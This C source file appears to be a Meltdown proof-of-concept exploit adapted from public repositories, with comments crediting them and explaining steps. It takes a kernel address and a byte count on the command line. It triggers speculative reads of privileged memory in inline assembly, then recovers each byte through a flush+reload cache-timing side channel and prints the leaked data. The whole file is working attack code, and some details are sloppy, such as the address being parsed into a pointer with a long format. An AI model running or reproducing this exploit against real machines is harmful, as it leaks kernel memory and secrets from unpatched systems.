// most of the code is modified according to the code in  https://github.com/paboldin/meltdown-exploit and https://github.com/IAIK/meltdown
// also get a lot of help from Haowei Deng and Haoyu Wang
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h> 
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>

#define pagesize 4096    

jmp_buf Jump_Buffer;
static void SegErrCatch(int sig){
    siglongjmp(Jump_Buffer,1);
}

static char volatile test[256*pagesize]={};

int attack(char* addr)
{	
	if(!sigsetjmp(Jump_Buffer,1)) 
	{
		asm volatile 
		(
		 //volatile it will not be modified by the compiler,the most important part of the code
		 //this part is copied from https://github.com/paboldin/meltdown-exploit without any modifications
		// this part has been modified into a library in https://github.com/IAIK/meltdown didn't use this library in this program 
		".rept 300\n\t"
		"add $0x100, %%rax\n\t"
		".endr\n\t"
		"movzx (%[addr]), %%rax\n\t"
        	"shl $12, %%rax\n\t"
       	 	"mov (%[target], %%rax, 1), %%rbx\n"
		:
		: [target] "r" (test),
		  [addr] "r" (addr)
		: "rax","rbx"
		);	
	}
	else	return 0;
}

int readtime(volatile char *addr)
{ 
    unsigned long long  begin,end,interval;
    int temp=0;
    begin = __rdtscp(&temp);//the begin time
    asm volatile("movl (%0), %%eax\n" : : "c"(addr) : "eax");//read the memory,if it is in the cache, it will be much faster and cost little time.
    end = __rdtscp(&temp);//the end time and the interval is the time used to record all the things
    interval=end-begin;
    return interval;
}

int loading()
{  //the fastest read one is the one in the cache, so we load it
    unsigned int volatile number,need,min=0xffffffff,time;
    for (int i=0;i<256;i++){
        number=((i * 167) + 13) % 256; // a trick used in to minimize the influnence of the branch pridiction 
					//copied from  https://blog.csdn.net/qq_25827741/article/details/78994970
        time=readtime(test+pagesize*number);
        if (min>time){
            need = number;			//found a smaller one and  change the number needed
	    min = time;
        }
    }
    return need;   
}
void readbyte(int fd,char *addr){//read a byte
    static char buffer[256];
    int i;
    memset(test,0xef, sizeof(test));    //the initialization of the test 
    pread(fd, buffer, sizeof(buffer), 0);   
    for (i=0;i<256;i++)
        _mm_clflush(test+i*pagesize);//make sure test is not in the cache
    if (attack(addr)!=0) 
    {	
	printf("it failed\n");
	exit(-1);
    }
    return;
}
int main(int argc, const char* * argv){      
    int page[256];
    char* address;
    int i,j;
    int temp,length,first,second;
    int fd = open("/proc/version", O_RDONLY);//open a file
    signal(SIGSEGV,SegErrCatch);//signal   
    sscanf(argv[1],"%lx",&address);//melt.sh give the address to the program
    sscanf(argv[2],"%d",&length);//the number of bytes you want to hack
    printf("the adrress is : %lx\n the number of bytes this program hack is %d：\n",address,length);
    printf("all the things hacked are here:\n");
    int count=0;
    for (j=0;j<length;j++)
    {
	first=0;
	second=0;
        memset(page,0,sizeof(page));		// first all the page numbers are set to 0
	while (page[first]<=2*page[second]+10)
	{
		readbyte(fd,address);
		temp=loading();
        page[temp]++;
		//printf("%d ",temp);

		if (temp!=first)
		{
			if (page[temp]>page[second]&&page[temp]<=page[first]) 
				second=temp;
			if (page[temp]>page[first]) 
			{
				second=first;
				first=temp;	
			}
		}//change the biggest and the second biggest			
    }
/*
	temp=0;
	for (i=0;i<256;i++)
		if (page[i]>page[temp])     
			temp=i;		// find all the biggest t*/
	printf("%lx:%c \n",address,first);  
	address++;      
	//if (count%5==0)		printf("\n");
	count++;
    }
    printf("\n");
    close (fd);
}
